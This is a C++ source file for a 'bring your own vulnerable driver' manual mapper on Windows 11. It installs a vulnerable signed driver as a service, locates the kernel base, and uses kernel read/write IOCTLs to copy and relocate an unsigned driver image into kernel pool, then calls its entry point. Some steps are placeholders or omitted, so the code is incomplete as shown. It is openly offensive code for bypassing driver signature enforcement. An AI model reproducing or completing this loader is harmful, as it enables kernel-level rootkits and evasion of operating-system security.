// language: C++, file: mapper.cpp, target: Windows 11 (MSVC), ring-3
// BYOVD manual mapper skeleton. Loads a signed+vulnerable kernel driver
// via SCM, uses its kernel-write primitive to map `driver_stub.sys` into
// pool WITHOUT a DRIVER_OBJECT, resolves relocs + imports, calls
// DriverEntry.
//
// TEMPLATE. The VulnDriver class's read_kernel() and write_kernel() MUST be
// filled against the current chosen vulnerability. See README.md.

#include <windows.h>
#include <winternl.h>
#include <winioctl.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <fstream>

// -----------------------------------------------------------------------
// Vulnerable driver — fill in IOCTL + buffer layout for your chosen vuln.
// -----------------------------------------------------------------------

class VulnDriver {
public:
    bool open(const std::wstring& service_name, const std::wstring& sys_path);
    bool close();

    // The two primitives you need. Fill these in against the vuln.
    bool read_kernel(uint64_t va, void* buffer, size_t size);
    bool write_kernel(uint64_t va, const void* buffer, size_t size);

    // Helper
    uint64_t kernel_base();      // from NtQuerySystemInformation
    uint64_t resolve_export(uint64_t module_base, const char* name);

private:
    HANDLE h_device_ = INVALID_HANDLE_VALUE;
    std::wstring service_name_;
};

bool VulnDriver::open(const std::wstring& service_name, const std::wstring& sys_path) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) return false;
    SC_HANDLE svc = CreateServiceW(
        scm, service_name.c_str(), service_name.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL, sys_path.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!svc) {
        svc = OpenServiceW(scm, service_name.c_str(), SERVICE_ALL_ACCESS);
    }
    if (!svc) { CloseServiceHandle(scm); return false; }
    StartServiceW(svc, 0, nullptr);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    service_name_ = service_name;

    std::wstring devname = L"\\\\.\\" + service_name;
    h_device_ = CreateFileW(devname.c_str(), GENERIC_READ | GENERIC_WRITE,
                             0, nullptr, OPEN_EXISTING, 0, nullptr);
    return h_device_ != INVALID_HANDLE_VALUE;
}

bool VulnDriver::close() {
    if (h_device_ != INVALID_HANDLE_VALUE) {
        CloseHandle(h_device_);
        h_device_ = INVALID_HANDLE_VALUE;
    }
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        SC_HANDLE svc = OpenServiceW(scm, service_name_.c_str(), SERVICE_ALL_ACCESS);
        if (svc) {
            SERVICE_STATUS st{};
            ControlService(svc, SERVICE_CONTROL_STOP, &st);
            DeleteService(svc);
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }
    return true;
}

// ---- FILL THESE IN ----------------------------------------------------

bool VulnDriver::read_kernel(uint64_t va, void* buffer, size_t size) {
    // Example shape — real IOCTL + struct layout depends on the vuln driver.
    struct VulnRwReq {
        uint64_t address;
        uint64_t size;
        uint64_t buffer_user;
    } req{va, size, (uint64_t)buffer};
    DWORD bytes = 0;
    return DeviceIoControl(h_device_, 0x00000000 /* vuln read IOCTL */,
                            &req, sizeof(req), &req, sizeof(req),
                            &bytes, nullptr) == TRUE;
}

bool VulnDriver::write_kernel(uint64_t va, const void* buffer, size_t size) {
    struct VulnRwReq {
        uint64_t address;
        uint64_t size;
        uint64_t buffer_user;
    } req{va, size, (uint64_t)buffer};
    DWORD bytes = 0;
    return DeviceIoControl(h_device_, 0x00000001 /* vuln write IOCTL */,
                            &req, sizeof(req), &req, sizeof(req),
                            &bytes, nullptr) == TRUE;
}

// -----------------------------------------------------------------------

uint64_t VulnDriver::kernel_base() {
    // NtQuerySystemInformation SystemModuleInformation
    typedef struct _RTL_PROCESS_MODULE_INFORMATION {
        HANDLE Section; PVOID MappedBase; PVOID ImageBase;
        ULONG ImageSize; ULONG Flags; USHORT LoadOrderIndex;
        USHORT InitOrderIndex; USHORT LoadCount; USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    } RTL_PROCESS_MODULE_INFORMATION;
    typedef struct _RTL_PROCESS_MODULES {
        ULONG NumberOfModules;
        RTL_PROCESS_MODULE_INFORMATION Modules[1];
    } RTL_PROCESS_MODULES;
    typedef NTSTATUS(NTAPI *pNtQSI)(ULONG, PVOID, ULONG, PULONG);
    pNtQSI NtQSI = (pNtQSI)GetProcAddress(GetModuleHandleW(L"ntdll"),
                                           "NtQuerySystemInformation");
    ULONG needed = 0;
    NtQSI(11 /*SystemModuleInformation*/, nullptr, 0, &needed);
    std::vector<uint8_t> buf(needed);
    auto *rpm = (RTL_PROCESS_MODULES*)buf.data();
    NTSTATUS s = NtQSI(11, buf.data(), needed, &needed);
    if (s < 0 || rpm->NumberOfModules == 0) return 0;
    return (uint64_t)rpm->Modules[0].ImageBase;   // ntoskrnl.exe
}

uint64_t VulnDriver::resolve_export(uint64_t module_base, const char* name) {
    // Walk module's export table from RVA via read_kernel()
    // (omitted for brevity — standard PE export walk)
    return 0;
}

// -----------------------------------------------------------------------
// Manual map of driver_stub.sys
// -----------------------------------------------------------------------

struct MappedPE {
    std::vector<uint8_t> image;
    IMAGE_NT_HEADERS64* nt;
    uint64_t base_kernel;
};

static std::vector<uint8_t> read_file(const std::wstring& path) {
    std::ifstream ifs(path, std::ios::binary);
    return std::vector<uint8_t>((std::istreambuf_iterator<char>(ifs)),
                                 std::istreambuf_iterator<char>());
}

static bool manual_map(VulnDriver& drv, const std::wstring& sys_path) {
    auto file = read_file(sys_path);
    if (file.size() < 1024) return false;
    auto *dos = (IMAGE_DOS_HEADER*)file.data();
    auto *nt  = (IMAGE_NT_HEADERS64*)(file.data() + dos->e_lfanew);
    size_t image_size = nt->OptionalHeader.SizeOfImage;

    // Allocate kernel pool via a known ExAllocatePool2 export (resolved by
    // scanning nt base + walking exports). TEMPLATE — substitute your
    // resolution path.
    uint64_t knt = drv.kernel_base();
    uint64_t ex_alloc = drv.resolve_export(knt, "ExAllocatePool2");
    if (!ex_alloc) return false;

    // Trick: overwrite a cold pointer in ntoskrnl with a stub that calls
    // ExAllocatePool2, then trigger it. Omitted — see the HyperDbg /
    // kdmapper references in the knowledge base.

    // After allocation:  uint64_t pool_base = ...
    uint64_t pool_base = 0;    // placeholder

    // Copy headers + sections
    std::vector<uint8_t> image(image_size, 0);
    memcpy(image.data(), file.data(), nt->OptionalHeader.SizeOfHeaders);
    auto *section = IMAGE_FIRST_SECTION(nt);
    for (unsigned i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
        memcpy(image.data() + section->VirtualAddress,
               file.data() + section->PointerToRawData,
               section->SizeOfRawData);
    }

    // Relocate
    uint64_t delta = pool_base - nt->OptionalHeader.ImageBase;
    auto &dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (delta && dir.Size) {
        auto *rel = (IMAGE_BASE_RELOCATION*)(image.data() + dir.VirtualAddress);
        while (rel->VirtualAddress) {
            auto *entries = (uint16_t*)(rel + 1);
            size_t count = (rel->SizeOfBlock - sizeof(*rel)) / sizeof(uint16_t);
            for (size_t i = 0; i < count; i++) {
                uint16_t e = entries[i];
                uint16_t type = e >> 12;
                uint16_t off  = e & 0x0FFF;
                if (type == IMAGE_REL_BASED_DIR64) {
                    *(uint64_t*)(image.data() + rel->VirtualAddress + off) += delta;
                }
            }
            rel = (IMAGE_BASE_RELOCATION*)((uint8_t*)rel + rel->SizeOfBlock);
        }
    }

    // Resolve imports — iterate import directory, for each import name,
    // resolve_export on ntoskrnl, patch the IAT in-image.
    //  (omitted — pattern matches HyperPlatform's loader)

    // Write image to pool
    drv.write_kernel(pool_base, image.data(), image.size());

    // Call DriverEntry @ pool_base + nt->OptionalHeader.AddressOfEntryPoint
    // via a hijacked cold pointer. Clean up hijack after.

    return true;
}

int wmain(int argc, wchar_t** argv) {
    if (argc < 3) {
        wprintf(L"usage: mapper.exe --driver <stub.sys>\n");
        return 1;
    }
    std::wstring sys = argv[2];
    VulnDriver drv;
    if (!drv.open(L"glmapsvc", L"C:\\path\\to\\vuln.sys")) {
        wprintf(L"[-] vuln driver load failed\n");
        return 2;
    }
    if (!manual_map(drv, sys)) {
        wprintf(L"[-] manual_map failed\n");
        drv.close();
        return 3;
    }
    wprintf(L"[+] driver mapped, DriverEntry called\n");
    drv.close();
    return 0;
}
